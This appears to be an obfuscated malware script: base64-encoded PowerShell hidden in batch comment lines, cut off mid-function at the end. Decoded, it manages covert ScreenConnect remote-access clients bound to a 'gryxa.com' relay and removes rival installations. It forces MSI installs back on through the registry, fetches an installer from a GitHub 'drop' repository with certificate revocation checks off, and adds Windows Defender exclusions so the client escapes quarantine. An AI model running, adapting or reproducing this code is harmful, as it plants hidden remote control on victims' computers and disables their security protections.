::UGF0aCAoR2V0LUdyeXhhQ2ZnUGF0aCkgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQ0K
::fQ0KDQojIEwzOTogbmV2ZXIgYWRvcHQgYSBmb3JlaWduIFNDIGFzIEdyeXhhLiBL
::ZWVwZXIgb25seSBpZiBGUCBpcyBFeHBlY3RlZEZwIE9SDQojIEltYWdlUGF0aC9j
::bWRsaW5lIGNvbnRhaW5zIGdyeXhhLmNvbSAob3IgY2ZnIFJFTEFZIGhvc3QpLiBE
::byBOT1QgdHJ1c3QgY2ZnIGFsb25lIOKAlA0KIyBhIHBvaXNvbmVkIENVUlJFTlRf
::RlAgd291bGQgc2VsZi13aGl0ZWxpc3QgZm9yZXZlci4NCmZ1bmN0aW9uIFRlc3Qt
::SXNHcnl4YUZwKFtzdHJpbmddJEZwKSB7DQogICAgaWYgKC1ub3QgJEZwKSB7IHJl
::dHVybiAkZmFsc2UgfQ0KICAgICRmcCA9ICRGcC5Ub0xvd2VyKCkNCiAgICBpZiAo
::JGZwIC1pbiAkc2NyaXB0OlNldnJ6S2VlcCkgeyByZXR1cm4gJGZhbHNlIH0NCiAg
::ICBpZiAoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnAgLWFuZCAkZnAgLWVxICRzY3Jp
::cHQ6R3J5eGFFeHBlY3RlZEZwLlRvTG93ZXIoKSkgeyByZXR1cm4gJHRydWUgfQ0K
::ICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkZnApIg0KICAgICRp
::bWcgPSBbc3RyaW5nXShHZXQtSXRlbVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3Vy
::cmVudENvbnRyb2xTZXRcU2VydmljZXNcJG5hbWUiIC1FcnJvckFjdGlvbiBTaWxl
::bnRseUNvbnRpbnVlKS5JbWFnZVBhdGgNCiAgICAkcmVsYXkgPSAkc2NyaXB0Okdy
::eXhhUmVsYXlIb3N0DQogICAgaWYgKCRpbWcgLWFuZCAoJGltZyAtbWF0Y2ggJyg/
::aSlncnl4YVwuY29tJyAtb3IgKCRyZWxheSAtYW5kICRpbWcgLWxpa2UgIiokcmVs
::YXkqIikpKSB7IHJldHVybiAkdHJ1ZSB9DQogICAgZm9yZWFjaCAoJHByb2MgaW4g
::KEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1GaWx0ZXIgIk5hbWUgbGlr
::ZSAnU2NyZWVuQ29ubmVjdCUnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
::ZSkpIHsNCiAgICAgICAgJGJsb2IgPSAiJChbc3RyaW5nXSRwcm9jLkV4ZWN1dGFi
::bGVQYXRoKSAkKFtzdHJpbmddJHByb2MuQ29tbWFuZExpbmUpIg0KICAgICAgICBp
::ZiAoJGJsb2IgLWxpa2UgIiokZnAqIiAtYW5kICgkYmxvYiAtbWF0Y2ggJyg/aSln
::cnl4YVwuY29tJyAtb3IgKCRyZWxheSAtYW5kICRibG9iIC1saWtlICIqJHJlbGF5
::KiIpKSkgew0KICAgICAgICAgICAgcmV0dXJuICR0cnVlDQogICAgICAgIH0NCiAg
::ICB9DQogICAgcmV0dXJuICRmYWxzZQ0KfQ0KDQpmdW5jdGlvbiBHZXQtS2VlcEZp
::bmdlcnByaW50cyB7DQogICAgJHNldCA9IE5ldy1PYmplY3QgJ1N5c3RlbS5Db2xs
::ZWN0aW9ucy5HZW5lcmljLkhhc2hTZXRbc3RyaW5nXScgKFtTdHJpbmdDb21wYXJl
::cl06Ok9yZGluYWxJZ25vcmVDYXNlKQ0KICAgIGZvcmVhY2ggKCRzIGluIChHZXQt
::U2V2cnpLZWVwKSkgeyBbdm9pZF0kc2V0LkFkZCgkcykgfQ0KICAgIGlmICgkc2Ny
::aXB0OkdyeXhhRXhwZWN0ZWRGcCkgeyBbdm9pZF0kc2V0LkFkZCgkc2NyaXB0Okdy
::eXhhRXhwZWN0ZWRGcCkgfQ0KICAgICRjZmcgPSBHZXQtR3J5eGFGcA0KICAgIGlm
::ICgkY2ZnIC1hbmQgKFRlc3QtSXNHcnl4YUZwICRjZmcpKSB7IFt2b2lkXSRzZXQu
::QWRkKCRjZmcpIH0NCiAgICBlbHNlaWYgKCRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZw
::KSB7IFt2b2lkXSRzZXQuQWRkKCRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwKSB9DQog
::ICAgZWxzZSB7IFt2b2lkXSRzZXQuQWRkKCRzY3JpcHQ6R3J5eGFEZWZhdWx0RnAp
::IH0NCiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQqJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
::ZSkpIHsNCiAgICAgICAgaWYgKCRzdmMuU3RhdHVzIC1ub3RpbiBAKCdSdW5uaW5n
::JywnU3RhcnRQZW5kaW5nJywnQ29udGludWVQZW5kaW5nJykpIHsgY29udGludWUg
::fQ0KICAgICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9
::KVwpJykgew0KICAgICAgICAgICAgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigp
::DQogICAgICAgICAgICBpZiAoJGZwIC1pbiAkc2NyaXB0OlNldnJ6S2VlcCkgeyBj
::b250aW51ZSB9DQogICAgICAgICAgICBpZiAoVGVzdC1Jc0dyeXhhRnAgJGZwKSB7
::IFt2b2lkXSRzZXQuQWRkKCRmcCk7IFNldC1Hcnl4YUZwICRmcCB9DQogICAgICAg
::IH0NCiAgICB9DQogICAgcmV0dXJuIEAoJHNldCkNCn0NCg0KZnVuY3Rpb24gVGVz
::dC1UY3BIb3N0UG9ydChbc3RyaW5nXSRIb3N0TmFtZSwgW2ludF0kUG9ydCA9IDQ0
::MywgW2ludF0kVGltZW91dE1zID0gODAwMCkgew0KICAgIGlmICgtbm90ICRIb3N0
::TmFtZSkgeyByZXR1cm4gJGZhbHNlIH0NCiAgICAkYyA9ICRudWxsDQogICAgdHJ5
::IHsNCiAgICAgICAgJGMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5U
::Y3BDbGllbnQNCiAgICAgICAgJGlhciA9ICRjLkJlZ2luQ29ubmVjdCgkSG9zdE5h
::bWUsICRQb3J0LCAkbnVsbCwgJG51bGwpDQogICAgICAgIGlmICgtbm90ICRpYXIu
::QXN5bmNXYWl0SGFuZGxlLldhaXRPbmUoJFRpbWVvdXRNcywgJGZhbHNlKSkgeyB0
::cnkgeyAkYy5DbG9zZSgpIH0gY2F0Y2gge307IHJldHVybiAkZmFsc2UgfQ0KICAg
::ICAgICAkYy5FbmRDb25uZWN0KCRpYXIpOyByZXR1cm4gJHRydWUNCiAgICB9IGNh
::dGNoIHsgcmV0dXJuICRmYWxzZSB9IGZpbmFsbHkgeyBpZiAoJGMpIHsgdHJ5IHsg
::JGMuQ2xvc2UoKSB9IGNhdGNoIHt9IH0gfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtTXNp
::UHJvcGVydHkoW3N0cmluZ10kTXNpUGF0aCwgW3N0cmluZ10kUHJvcGVydHlOYW1l
::KSB7DQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJE1zaVBh
::dGgpKSB7IHJldHVybiAkbnVsbCB9DQogICAgdHJ5IHsNCiAgICAgICAgJGkgPSBO
::ZXctT2JqZWN0IC1Db21PYmplY3QgV2luZG93c0luc3RhbGxlci5JbnN0YWxsZXIN
::CiAgICAgICAgJGRiID0gJGkuT3BlbkRhdGFiYXNlKChSZXNvbHZlLVBhdGggLUxp
::dGVyYWxQYXRoICRNc2lQYXRoKS5QYXRoLCAwKQ0KICAgICAgICAkdiA9ICRkYi5P
::cGVuVmlldygiU0VMRUNUIGBWYWx1ZWAgRlJPTSBgUHJvcGVydHlgIFdIRVJFIGBQ
::cm9wZXJ0eWA9JyRQcm9wZXJ0eU5hbWUnIikNCiAgICAgICAgJHYuRXhlY3V0ZSgp
::IHwgT3V0LU51bGwNCiAgICAgICAgJHIgPSAkdi5GZXRjaCgpDQogICAgICAgIGlm
::ICgtbm90ICRyKSB7IHJldHVybiAkbnVsbCB9DQogICAgICAgIHJldHVybiBbc3Ry
::aW5nXSRyLlN0cmluZ0RhdGEoMSkNCiAgICB9IGNhdGNoIHsgcmV0dXJuICRudWxs
::IH0NCn0NCg0KZnVuY3Rpb24gR2V0LUZwRnJvbVByb2R1Y3ROYW1lKFtzdHJpbmdd
::JFByb2R1Y3ROYW1lKSB7DQogICAgaWYgKCRQcm9kdWN0TmFtZSAtbWF0Y2ggJ1wo
::KFswLTlhLWZBLUZdezE2fSlcKScpIHsgcmV0dXJuICRtYXRjaGVzWzFdLlRvTG93
::ZXIoKSB9DQogICAgcmV0dXJuICRudWxsDQp9DQoNCmZ1bmN0aW9uIEZpbmQtUHJv
::ZHVjdEd1aWQoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICAkbmFtZSA9ICJT
::Y3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSINCiAgICBmb3JlYWNo
::ICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7DQogICAgICAgIGlm
::ICgtbm90IChUZXN0LVBhdGggJHJvb3QpKSB7IGNvbnRpbnVlIH0NCiAgICAgICAg
::Zm9yZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZSkpIHsNCiAgICAgICAgICAgICRkbiA9IChHZXQt
::SXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlKS5EaXNwbGF5TmFtZQ0KICAgICAgICAgICAgaWYgKCRkbiAtYW5kICgk
::ZG4gLWllcSAkbmFtZSkgLWFuZCAoJGtleS5QU0NoaWxkTmFtZSAtbGlrZSAneyp9
::JykpIHsgcmV0dXJuICRrZXkuUFNDaGlsZE5hbWUgfQ0KICAgICAgICB9DQogICAg
::fQ0KICAgIHJldHVybiAkbnVsbA0KfQ0KDQpmdW5jdGlvbiBUZXN0LVNjUnVubmlu
::Zyhbc3RyaW5nXSRGaW5nZXJwcmludCkgew0KICAgIGlmICgtbm90ICRGaW5nZXJw
::cmludCkgeyByZXR1cm4gJGZhbHNlIH0NCiAgICAkc3ZjID0gR2V0LVNlcnZpY2Ug
::LU5hbWUgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIiAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIHJldHVybiBbYm9vbF0oJHN2
::YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAnUnVubmluZycpDQp9DQoNCmZ1bmN0aW9u
::IFRlc3QtU2NEaXIoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICBmb3JlYWNo
::ICgkYmFzZSBpbiBAKCR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSwgJGVudjpQcm9n
::cmFtRmlsZXMpKSB7DQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRo
::IChKb2luLVBhdGggJGJhc2UgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2Vy
::cHJpbnQpIikpIHsgcmV0dXJuICR0cnVlIH0NCiAgICB9DQogICAgcmV0dXJuICRm
::YWxzZQ0KfQ0KDQpmdW5jdGlvbiBGaW5kLVJ1bm5pbmdHcnl4YUZwIHsNCiAgICAk
::Y2ZnID0gR2V0LUdyeXhhRnANCiAgICBpZiAoJGNmZyAtYW5kIChUZXN0LVNjUnVu
::bmluZyAkY2ZnKSAtYW5kIChUZXN0LUlzR3J5eGFGcCAkY2ZnKSkgeyByZXR1cm4g
::JGNmZyB9DQogICAgaWYgKCRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwIC1hbmQgKFRl
::c3QtU2NSdW5uaW5nICRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwKSkgeyByZXR1cm4g
::JHNjcmlwdDpHcnl4YUV4cGVjdGVkRnAuVG9Mb3dlcigpIH0NCiAgICBmb3JlYWNo
::ICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGll
::bnQqJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsNCiAgICAgICAg
::aWYgKCRzdmMuU3RhdHVzIC1ub3RpbiBAKCdSdW5uaW5nJywnU3RhcnRQZW5kaW5n
::JywnQ29udGludWVQZW5kaW5nJykpIHsgY29udGludWUgfQ0KICAgICAgICBpZiAo
::JHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgew0KICAgICAg
::ICAgICAgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpDQogICAgICAgICAgICBp
::ZiAoJGZwIC1pbiAkc2NyaXB0OlNldnJ6S2VlcCkgeyBjb250aW51ZSB9DQogICAg
::ICAgICAgICBpZiAoVGVzdC1Jc0dyeXhhRnAgJGZwKSB7IHJldHVybiAkZnAgfQ0K
::ICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkbnVsbA0KfQ0KDQpmdW5jdGlv
::biBUZXN0LUFueU5vblNldnJ6U2NSdW5uaW5nIHsgcmV0dXJuIFtib29sXShGaW5k
::LVJ1bm5pbmdHcnl4YUZwKSB9DQoNCmZ1bmN0aW9uIEdldC1Hcnl4YVN0YXR1cyhb
::c3RyaW5nXSRmcCkgew0KICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAiU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgKCRmcCkiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlDQogICAgIyBMMzk6IFN0YXJ0UGVuZGluZy9Db250aW51ZVBlbmRpbmcg
::PSBoZWFsdGh5LWluLXByb2dyZXNzIChub3QgQlJPS0VOKQ0KICAgICRydW5uaW5n
::ID0gW2Jvb2xdKCRzdmMgLWFuZCAkc3ZjLlN0YXR1cyAtaW4gQCgnUnVubmluZycs
::J1N0YXJ0UGVuZGluZycsJ0NvbnRpbnVlUGVuZGluZycpKQ0KICAgICRkaXIgPSBU
::ZXN0LVNjRGlyICRmcA0KICAgICRndWlkID0gRmluZC1Qcm9kdWN0R3VpZCAkZnAN
::CiAgICAkdGNwUiA9ICR0cnVlOyAkdGNwVSA9ICR0cnVlDQogICAgIyBza2lwIFRD
::UCBvbiBob3QgcGF0aCB3aGVuIGFscmVhZHkgcnVubmluZyB1bmxlc3MgRGVlcCAo
::RGVlcCBzZXRzIEV4dHJhPWRlZXAtdGNwIHZpYSBjYWxsZXIpDQogICAgaWYgKCRE
::ZWVwIC1vciAtbm90ICRydW5uaW5nKSB7DQogICAgICAgICR0Y3BSID0gVGVzdC1U
::Y3BIb3N0UG9ydCAkc2NyaXB0OkdyeXhhUmVsYXlIb3N0IDQ0Mw0KICAgICAgICAk
::dGNwVSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpHcnl4YVVpSG9zdCA0NDMN
::CiAgICB9DQogICAgaWYgKCRydW5uaW5nKSB7IHJldHVybiAiSEVBTFRIWXwkZnB8
::cnVubmluZz0xfHJlbGF5PSR0Y3BSfHVpPSR0Y3BVIiB9DQogICAgaWYgKCRzdmMg
::LWFuZCAkZGlyKSB7IHJldHVybiAiQlJPS0VOfCRmcHxzdmMtcHJlc2VudC1zdG9w
::cGVkfHJlbGF5PSR0Y3BSfHVpPSR0Y3BVIiB9DQogICAgaWYgKC1ub3QgJHN2YyAt
::YW5kICgkZGlyIC1vciAkZ3VpZCkpIHsgcmV0dXJuICJTVFVDS3wkZnB8cmVnaXN0
::ZXJlZC1uby1zZXJ2aWNlfHJlbGF5PSR0Y3BSfHVpPSR0Y3BVIiB9DQogICAgcmV0
::dXJuICJBQlNFTlR8JGZwfG5vdC1pbnN0YWxsZWR8cmVsYXk9JHRjcFJ8dWk9JHRj
::cFUiDQp9DQoNCmZ1bmN0aW9uIFRlc3QtR3J5eGFIZWFsdGggeyByZXR1cm4gKEdl
::dC1Hcnl4YVN0YXR1cyAoR2V0LUdyeXhhRnApKSB9DQoNCmZ1bmN0aW9uIENsZWFy
::LUdyeXhhQXJwKFtzdHJpbmddJGZwKSB7DQogICAgJGd1aWQgPSBGaW5kLVByb2R1
::Y3RHdWlkICRmcA0KICAgIGZvcmVhY2ggKCRyIGluIEAoJ0hLTE06XFNPRlRXQVJF
::XE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsDQog
::ICAgICAgICAgICAgICAgICAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVc
::TWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJykpIHsN
::CiAgICAgICAgaWYgKCRndWlkIC1hbmQgKFRlc3QtUGF0aCAiJHJcJGd1aWQiKSkg
::eyBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggIiRyXCRndWlkIiAtUmVjdXJzZSAt
::Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQ0KICAgICAgICBH
::ZXQtQ2hpbGRJdGVtICRyIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwg
::Rm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJv
::cGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5E
::aXNwbGF5TmFtZQ0KICAgICAgICAgICAgaWYgKCRkbiAtbWF0Y2ggIlNjcmVlbkNv
::bm5lY3QgQ2xpZW50IFwoJChbcmVnZXhdOjpFc2NhcGUoJGZwKSlcKSIpIHsNCiAg
::ICAgICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJF8uUFNQYXRo
::IC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0K
::ICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBV
::bmluc3RhbGwtU2NGaW5nZXJwcmludChbc3RyaW5nXSRGaW5nZXJwcmludCkgew0K
::ICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vLWZwJyB9DQog
::ICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCki
::DQogICAgJGd1aWQgPSBGaW5kLVByb2R1Y3RHdWlkICRGaW5nZXJwcmludA0KICAg
::ICYgcmVnLmV4ZSBkZWxldGUgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9z
::b2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC9mIDI+JjEgfCBP
::dXQtTnVsbA0KICAgICYgcmVnLmV4ZSBhZGQgJ0hLTE1cU09GVFdBUkVcUG9saWNp
::ZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC90
::IFJFR19EV09SRCAvZCAwIC9mIDI+JjEgfCBPdXQtTnVsbA0KICAgIGlmICgkZ3Vp
::ZCkgeyBTdGFydC1Qcm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgIi94
::ICRndWlkIC9xbiAvbm9yZXN0YXJ0IFJFQk9PVD1SZWFsbHlTdXBwcmVzcyIgLVdh
::aXQgLVdpbmRvd1N0eWxlIEhpZGRlbjsgU3RhcnQtU2xlZXAgLVNlY29uZHMgNiB9
::DQogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlv
::biBTaWxlbnRseUNvbnRpbnVlDQogICAgaWYgKCRzdmMpIHsgJiBzYy5leGUgc3Rv
::cCAkbmFtZSAyPiYxIHwgT3V0LU51bGw7ICYgc2MuZXhlIGRlbGV0ZSAkbmFtZSAy
::PiYxIHwgT3V0LU51bGw7IFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDIgfQ0KICAgIENs
::ZWFyLUdyeXhhQXJwICRGaW5nZXJwcmludA0KICAgIGZvcmVhY2ggKCRiYXNlIGlu
::IEAoJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9LCAkZW52OlByb2dyYW1GaWxlcykp
::IHsNCiAgICAgICAgJGQgPSBKb2luLVBhdGggJGJhc2UgIlNjcmVlbkNvbm5lY3Qg
::Q2xpZW50ICgkRmluZ2VycHJpbnQpIg0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1M
::aXRlcmFsUGF0aCAkZCkgeyAmIHRha2Vvd24uZXhlIC9GICRkIC9SIC9EIFkgMj4m
::MSB8IE91dC1OdWxsOyBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vy
::c2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICB9
::DQogICAgcmV0dXJuICdyZW1vdmVkJw0KfQ0KDQpmdW5jdGlvbiBUZXN0LU1zaVBh
::Y2thZ2UoW3N0cmluZ10kUGF0aCwgW3N0cmluZ10kRXhwZWN0ZWRGcCA9ICcnKSB7
::DQogICAgIyBTaGFyZWQgT0xFLW1hZ2ljICsgb3B0aW9uYWwgUHJvZHVjdE5hbWUg
::RlAgZ2F0ZSAoTDM3L0wzOSkuIFVzZWQgYnkgR3J5eGEgKyBzZXZyeiBpbnN0YWxs
::IHBhdGhzLg0KICAgIGlmICgtbm90ICRQYXRoIC1vciAtbm90IChUZXN0LVBhdGgg
::LUxpdGVyYWxQYXRoICRQYXRoKSkgeyByZXR1cm4gJGZhbHNlIH0NCiAgICBpZiAo
::KEdldC1JdGVtIC1MaXRlcmFsUGF0aCAkUGF0aCkuTGVuZ3RoIC1sdCA1MDAwMDAp
::IHsgcmV0dXJuICRmYWxzZSB9DQogICAgdHJ5IHsNCiAgICAgICAgJGZzID0gW1N5
::c3RlbS5JTy5GaWxlXTo6T3BlblJlYWQoKFJlc29sdmUtUGF0aCAtTGl0ZXJhbFBh
::dGggJFBhdGgpLlBhdGgpDQogICAgICAgICRtYWdpYyA9IE5ldy1PYmplY3QgYnl0
::ZVtdIDQNCiAgICAgICAgJG51bGwgPSAkZnMuUmVhZCgkbWFnaWMsIDAsIDQpDQog
::ICAgICAgICRmcy5DbG9zZSgpDQogICAgICAgIGlmICgtbm90ICgkbWFnaWNbMF0g
::LWVxIDB4RDAgLWFuZCAkbWFnaWNbMV0gLWVxIDB4Q0YgLWFuZCAkbWFnaWNbMl0g
::LWVxIDB4MTEgLWFuZCAkbWFnaWNbM10gLWVxIDB4RTApKSB7IHJldHVybiAkZmFs
::c2UgfQ0KICAgIH0gY2F0Y2ggeyByZXR1cm4gJGZhbHNlIH0NCiAgICBpZiAoJEV4
::cGVjdGVkRnApIHsNCiAgICAgICAgJGZwID0gR2V0LUZwRnJvbVByb2R1Y3ROYW1l
::IChHZXQtTXNpUHJvcGVydHkgJFBhdGggJ1Byb2R1Y3ROYW1lJykNCiAgICAgICAg
::aWYgKC1ub3QgJGZwIC1vciAkZnAgLW5lICRFeHBlY3RlZEZwLlRvTG93ZXIoKSkg
::eyByZXR1cm4gJGZhbHNlIH0NCiAgICB9DQogICAgcmV0dXJuICR0cnVlDQp9DQoN
::CmZ1bmN0aW9uIEdldC1Hcnl4YU1zaSB7DQogICAgJG1zaSA9IEpvaW4tUGF0aCAk
::V29ya0RpciAncGtnX2dyeXhhLm1zaScNCiAgICAjIFdoZW4gYW4gRlAgaXMgcGlu
::bmVkLCB0aGUgY2FjaGVkIE1TSSBtdXN0IG1hdGNoIGl0OyBvdGhlcndpc2UgcmVm
::ZXRjaC4NCiAgICBpZiAoKFRlc3QtUGF0aCAkbXNpKSAtYW5kICgoR2V0LUl0ZW0g
::JG1zaSkuTGVuZ3RoIC1ndCAxMDAwMDAwKSkgew0KICAgICAgICBpZiAoLW5vdCAk
::c2NyaXB0OkdyeXhhRXhwZWN0ZWRGcCkgeyByZXR1cm4gJG1zaSB9DQogICAgICAg
::IGlmIChUZXN0LU1zaVBhY2thZ2UgJG1zaSAkc2NyaXB0OkdyeXhhRXhwZWN0ZWRG
::cCkgeyByZXR1cm4gJG1zaSB9DQogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFs
::UGF0aCAkbXNpIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0K
::ICAgIH0NCiAgICAkdG1wID0gSm9pbi1QYXRoICRlbnY6VEVNUCAoInNjX2dyeXhh
::X3swfS5tc2kiIC1mIFtndWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCdOJykpDQog
::ICAgIyBMMzE6IGdpdGh1Yi1kcm9wIEZJUlNUIChyYXcgd29ya3MgZXZlbiB3aGVu
::IHVpLmdyeXhhLmNvbSBUTFMgaXMgYnJva2VuKS4NCiAgICAkdXJscyA9IEAoDQog
::ICAgICAgICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVk
::ZHkvZ2l0aHViLWRyb3AvbWFpbi9wa2dfZ3J5eGEubXNpJywNCiAgICAgICAgJHNj
::cmlwdDpHcnl4YU1zaVVybA0KICAgICkNCiAgICAkY3VybCA9IEpvaW4tUGF0aCAk
::ZW52OlN5c3RlbVJvb3QgJ1N5c3RlbTMyXGN1cmwuZXhlJw0KICAgIGlmICgtbm90
::IChUZXN0LVBhdGggJGN1cmwpKSB7ICRjdXJsID0gJ2N1cmwuZXhlJyB9DQogICAg
::Zm9yZWFjaCAoJHUgaW4gJHVybHMpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAg
::ICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wIC1Gb3JjZSAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgJiAkY3VybCAtTCAt
::LXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgMjUgLS1tYXgtdGltZSAz
::MDAgLW8gJHRtcCAkdSAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgICAgIGlmICgo
::VGVzdC1QYXRoICR0bXApIC1hbmQgKChHZXQtSXRlbSAkdG1wKS5MZW5ndGggLWd0
::IDEwMDAwMDApKSB7DQogICAgICAgICAgICAgICAgJGV4cCA9IGlmICgkc2NyaXB0
::OkdyeXhhRXhwZWN0ZWRGcCkgeyAkc2NyaXB0OkdyeXhhRXhwZWN0ZWRGcCB9IGVs
::c2UgeyAnJyB9DQogICAgICAgICAgICAgICAgaWYgKC1ub3QgKFRlc3QtTXNpUGFj
::a2FnZSAkdG1wICRleHApKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgICAgICAgICB0
::cnkgeyBDb3B5LUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAgLURlc3RpbmF0aW9uICRt
::c2kgLUZvcmNlIC1FcnJvckFjdGlvbiBTdG9wOyByZXR1cm4gJG1zaSB9IGNhdGNo
::IHsgcmV0dXJuICR0bXAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNo
::IHt9DQogICAgfQ0KICAgIGlmIChUZXN0LVBhdGggJHRtcCkgeyBSZW1vdmUtSXRl
::bSAtTGl0ZXJhbFBhdGggJHRtcCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfQ0KICAgIHJldHVybiAkbnVsbA0KfQ0KDQpmdW5jdGlvbiBBZGQt
::U2NEZWZlbmRlckV4Y2x1c2lvbihbc3RyaW5nXSRGcCkgew0KICAgICMgRXhjbHVk
::ZSB0aGlzIEZQJ3MgU0MgZGlycyAod2lsZGNhcmQgKyBleHBsaWNpdCkgc28gUlRN
::IGNhbid0IHF1YXJhbnRpbmUgdGhlDQogICAgIyBjbGllbnQgb24gaW5zdGFsbC4g
::UmUtYXNzZXJ0ZWQgYmVmb3JlIGV2ZXJ5IGluc3RhbGwvbWlncmF0ZSDigJQgc3Vy
::dml2ZXMgRlAgcm90YXRpb25zLg0KICAgIHRyeSB7DQogICAgICAgICRuYW1lcyA9
::IEAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRnApIiwgJ1NjcmVlbkNvbm5lY3Qg
::Q2xpZW50KicpDQogICAgICAgIGZvcmVhY2ggKCRiYXNlIGluIEAoJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9LCAkZW52OlByb2dyYW1GaWxlcykpIHsNCiAgICAgICAg
::ICAgIGlmICgtbm90ICRiYXNlKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgICAgIGZv
::cmVhY2ggKCRuIGluICRuYW1lcykgeyBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNp
::b25QYXRoIChKb2luLVBhdGggJGJhc2UgJG4pIC1FcnJvckFjdGlvbiBTaWxlbnRs
::eUNvbnRpbnVlIH0NCiAgICAgICAgfQ0KICAgICAgICBBZGQtTXBQcmVmZXJlbmNl
::IC1FeGNsdXNpb25Qcm9jZXNzICdTY3JlZW5Db25uZWN0LkNsaWVudFNlcnZpY2Uu
